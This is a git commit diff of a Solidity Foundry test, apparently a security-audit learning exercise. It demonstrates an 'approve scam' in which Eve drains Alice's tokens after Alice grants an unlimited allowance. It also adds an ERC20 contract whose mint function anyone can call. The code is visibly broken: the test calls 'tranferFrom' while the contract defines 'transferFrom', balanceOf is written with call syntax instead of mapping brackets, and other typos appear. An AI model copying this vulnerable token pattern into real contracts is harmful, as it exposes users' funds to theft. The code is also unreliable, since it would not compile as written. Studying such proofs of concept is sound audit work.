ddbe98bb4fccb850948a07515385ba520864c5b7
sariKahan <125467824+sariKahan@users.noreply.github.com>
2024-03-30 20:29:24 +0000

    audit

--- audit/wallet/ApproveScam.sol
+++ audit/wallet/ApproveScam.sol
@@ -6,9 +6,35 @@ import "forge-std/console.sol";
 
 
 //problem eve can to take from accounr alice tokens
-contract contractTest is Test {
+contract ContractTest is Test {
     ERC20 ERC20Contract;
+    address alice = vm. addr(1);
+    address eve = vm.addr(2);
 
+    function testApproveScan() public {
+        ERC20Contract = new ERC20();
+        ERC20Contract.mint(1000);
+        ERC20Contract.transfer(address(alice), 1000);
+
+        vm.prank(alice);
+        ERC20Contract.approve(address(eve), type(uint256).max);
+
+        console.log(
+            "Before exploiting, Balance of Eve",
+            ERC20Contract.balanceOf(eve)
+        );
+
+        console.log("Due to Alice granded transfer permission to Eve, now Eve can move funds from Alice");
+
+        vm.prank(eve);
+        ERC20Contract.tranferFrom(address(alice), address(eve),1000);
+        console.log(
+            "After exploiting, Balance of Eve",
+            ERC20Contract.balanceOf(eve)
+        );
+        console.log("Exploint completed");
+    }
+    receive() external payable {}
 }
 
 interface IERC20{
@@ -58,5 +84,29 @@ contract ERC20 is IERC20 {
         emit Approval(msg.sender, spender,amount);
         return true;
     }
-    
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint amount
+    )
+    external returns (bool) {
+        allowance[sender][msg.sender] -= amount;
+        balanceOf(sender) -= amount;
+        balanceOf(recipient) += amount;
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    // anyone can do this function?
+    function mint(uint amount) external{
+        balanceOf(msg.sender) += amount;
+        totalSupply += amount;
+        emit Transfer(address(0), msg.sender, amount);
+    }
+
+    function burn(uint amount) external {
+        balanceOf[msg.sender] -= amount;
+        totalSupply -= amount;
+        emit Transfer(msg.sender, address(0), amount);
+    }
 }
